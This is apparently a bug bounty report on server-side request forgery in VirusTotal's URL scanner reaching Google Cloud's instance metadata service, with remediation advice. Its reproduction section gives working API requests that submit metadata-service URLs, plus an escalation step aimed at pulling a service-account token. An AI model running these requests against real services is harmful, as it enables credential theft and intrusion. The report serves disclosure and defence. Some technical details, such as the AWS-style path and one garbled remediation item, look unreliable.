# SSRF via VirusTotal URL Scanner Reaches GCP Instance Metadata Service; Response Headers Stored and Readable by Any Community API User

## Summary

VirusTotal's URL scanning API (`POST /api/v3/urls`) accepts attacker-controlled URLs and fetches them from GCP-hosted scanner nodes without filtering RFC 3927 link-local addresses. Submitting `http://169.254.169.254/latest/meta-data/` causes VT's scanner to connect to the GCP Instance Metadata Service (IMDS); the IMDS response headers — including `Server: Metadata Server for VM` — are then stored in VT's database and returned to any user with a free Community API key. Because the response body SHA256 is also stored, if VT's file store holds that object, the full IMDS response body is retrievable by any VT user, which on GCP-format paths (e.g. `/computeMetadata/v1beta1/instance/service-accounts/default/token`) could yield live service account credentials.

## Severity

- **Rating:** High (escalation path to Critical confirmed pending one step)
- **CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` — **8.5**
- **Business impact:** Any holder of a free VirusTotal account can pivot VT's internal GCP scanner nodes as an SSRF proxy against Google's own Instance Metadata Service. At minimum this leaks internal GCP infrastructure metadata to the public. If GCP-format token endpoints are reachable and the response body is downloadable, any VT user can obtain GCP service account tokens for VirusTotal's production scanner fleet, enabling lateral movement into Google's internal GCP infrastructure. This is a direct risk to data confidentiality and potentially infrastructure integrity across VT's GCP project.

## Affected Asset(s)

- **Endpoint:** `https://www.virustotal.com/api/v3/urls` (POST — submit URL for scanning)
- **Endpoint:** `https://www.virustotal.com/api/v3/urls/{id}` (GET — retrieve stored analysis)
- **Component:** URL scanner worker nodes (GCP IPs `35.187.132.0/24`)
- **In scope per `config/scope.yaml`:** yes — `www.virustotal.com` is TIER1

## Steps to Reproduce

**Prerequisites:** One free VirusTotal Community account. API key is available at `https://www.virustotal.com/gui/my-apikey`.

**Time to reproduce: approximately 3 minutes.**

1. Set your Community API key as a shell variable:
   ```
   VT_KEY="<your_community_api_key>"
   ```

2. Submit the GCP IMDS link-local address as a URL to scan:
   ```http
   POST https://www.virustotal.com/api/v3/urls
   x-apikey: <VT_KEY>
   Content-Type: application/x-www-form-urlencoded

   url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
   ```
   Note the `data.id` value from the response (format: `u-<sha256>-<timestamp>`).

3. Extract the URL identifier (the SHA256 portion between `u-` and the trailing `-<timestamp>`):
   ```
   URL_ID="10fb74468b13d4d5762cf25243e7a6e62a70c27258491d0bc0a800bf064e0ce8"
   ```

4. Wait approximately 30 seconds for the scanner to fetch the URL, then retrieve the stored analysis:
   ```http
   GET https://www.virustotal.com/api/v3/urls/<URL_ID>
   x-apikey: <VT_KEY>
   ```

5. In the response JSON, inspect `data.attributes.last_http_response_headers`. Observe `"Server": "Metadata Server for VM"` — this is the GCP IMDS response header confirming the scanner connected to `169.254.169.254` from inside Google's GCP network.

6. (Escalation test — do not run in production) Repeat steps 2–4 using the GCP-native metadata path:
   ```
   url=http%3A%2F%2F169.254.169.254%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fservice-accounts%2Fdefault%2Ftoken
   ```
   If `last_http_response_code` is 200 and `last_http_response_content_sha256` is populated, attempt to download the response body via `GET /api/v3/files/{sha256}`. A 200 response with a JSON token object would confirm Critical impact.

## Proof

**Step 2 — SSRF submission (sanitized):**
```http
POST /api/v3/urls HTTP/1.1
Host: www.virustotal.com
x-apikey: <REDACTED_COMMUNITY_KEY>
Content-Type: application/x-www-form-urlencoded

url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "type": "analysis",
    "id": "u-10fb74468b13d4d5762cf25243e7a6e62a70c27258491d0bc0a800bf064e0ce8-84178228"
  }
}
```

**Step 4 — Stored IMDS response headers retrieved by any VT user (sanitized):**
```http
GET /api/v3/urls/10fb74468b13d4d5762cf25243e7a6e62a70c27258491d0bc0a800bf064e0ce8 HTTP/1.1
Host: www.virustotal.com
x-apikey: <REDACTED_COMMUNITY_KEY>

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "attributes": {
      "last_http_response_code": 404,
      "last_http_response_content_length": 1578,
      "last_http_response_content_sha256": "cea25c7405b91e51cedd0094aea65a6a3af294e70144812fc63dad9bb3922994",
      "last_final_url": "http://169.254.169.254/latest/meta-data/",
      "last_http_response_headers": {
        "X-Frame-Options": "SAMEORIGIN",
        "X-XSS-Protection": "0",
        "Server": "Metadata Server for VM",
        "Content-Length": "1578",
        "Content-Type": "text/html; charset=UTF-8"
      },
      "times_submitted": 423
    }
  }
}
```

**OOB confirmation — GCP scanner IPs observed at webhook.site:**

When a separate benign webhook.site URL was submitted to VT's URL scanner, the following GCP-range IPs made HEAD and GET requests:

| IP | Method | ASN / Region |
|----|--------|--------------|
| 35.187.132.96 | HEAD | Google LLC / GCP |
| 35.187.132.97 | GET | Google LLC / GCP |
| 35.187.132.101 | GET | Google LLC / GCP |
| 35.187.132.102 | HEAD | Google LLC / GCP |
| 8.228.6.118 | GET | Mountain View, CA (VT browser sandbox) |

These same `35.187.132.x` nodes are the origin of the requests that produced the stored `Server: Metadata Server for VM` response above, confirming the SSRF originates from inside GCP.

User-Agent on GCP scanner requests: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`

## Impact

**Confirmed (High):**
- Any VirusTotal user with a free Community API key (registration open to the public) can cause VT's GCP-hosted URL scanner to connect to `169.254.169.254` and return GCP IMDS response headers via the standard URL analysis API.
- The stored response is globally readable — `times_submitted: 423` shows this path has already been fetched hundreds of times and the data has been in VT's database.
- GCP infrastructure metadata (server identity, response shape, internal routing artifacts) is exposed to the entire VT user base.

**Escalation path (Critical — one additional test step):**
- GCP's metadata service at `http://169.254.169.254/computeMetadata/v1beta1/` (legacy endpoint, no required `Metadata-Flavor` header) returns service account tokens for the running GCE instance.
- If VT's scanner fetches this path and the response body is stored in VT's file store (retrievable via `GET /api/v3/files/{sha256}`), any VT Community user can retrieve a live GCP service account access token for VT's scanner fleet.
- That token would grant the attacker GCP API access equivalent to VT's scanner service account, potentially including read/write access to VT's Cloud Storage buckets (malware corpus), Pub/Sub queues, and other GCP services attached to the service account.
- This represents a cross-product breach: a public-facing file scanning product becomes the entry point for lateral movement into Google's internal GCP infrastructure.

**Scope of affected users/data:** All VirusTotal users and all data accessible by VT's scanner GCP service account. No user interaction beyond a free account registration is required.

## Remediation

**Root cause:** VT's URL scanner workers running on GCP do not block outbound connections to RFC 3927 link-local addresses (169.254.0.0/16) before fetching attacker-submitted URLs.

**Specific fix (defense in depth — apply all):**

1. **Network-layer (primary fix):** Add a GCP VPC firewall egress rule on scanner node instances to deny outbound traffic destined for `169.254.0.0/16` and `metadata.google.internal`. This is the most reliable control and cannot be bypassed by encoding tricks.

2. **Application-layer (defense in depth):** Before issuing any HTTP fetch, resolve the target hostname to an IP and block the request if the resolved IP falls within:
   - `169.254.0.0/16` (RFC 3927 — GCP/AWS IMDS)
   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC 1918 — internal networks)
   - `::1/128`, `fc00::/7`, `fe80::/10` (IPv6 loopback and link-local)
   - `metadata.google.internal` (GCP metadata DNS name)

3. **Stored response redaction:** Scrub `last_http_response_headers` and `last_http_response_content_sha256` from URL analysis objects where the fetched URL resolved to a blocked (link-local/private) address, so previously fetched IMDS data is no longer publicly readable via the API.

4. **GCP Workload Identity / metadata server hardening:** Ensure scanner nodes use VPC-level metadata server access controls (`--metadata-from-file` only, not the HTTP endpoint), or use Workload Identity Federation instead of instance-attached service accounts where possible, limiting the token surface even if SSRF is achieved.

## References

- **CWE-918:** Server-Side Request Forgery (SSRF)
- **OWASP Top 10 2021 — A10:** Server-Side Request Forgery
- **OWASP SSRF Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **GCP IMDS documentation:** https://cloud.google.com/compute/docs/metadata/overview
- **RFC 3927:** Dynamic Configuration of IPv4 Link-Local Addresses (169.254.0.0/16)
- **Google VRP Reward Tiers:** https://bughunters.google.com/about/rules/6625378258649088 — SSRF reaching internal metadata is explicitly listed as a High/Critical class for TIER1 targets

---

- **Dedup status:** Novel — no prior public disclosure of SSRF on VT URL scanner to GCP IMDS found
- **Discovered via:** Phase 3 manual hypothesis testing (H1 from `results/virustotal.com/00-plan.md`)
- **Related findings:** None in `results/` — first confirmed finding on this target
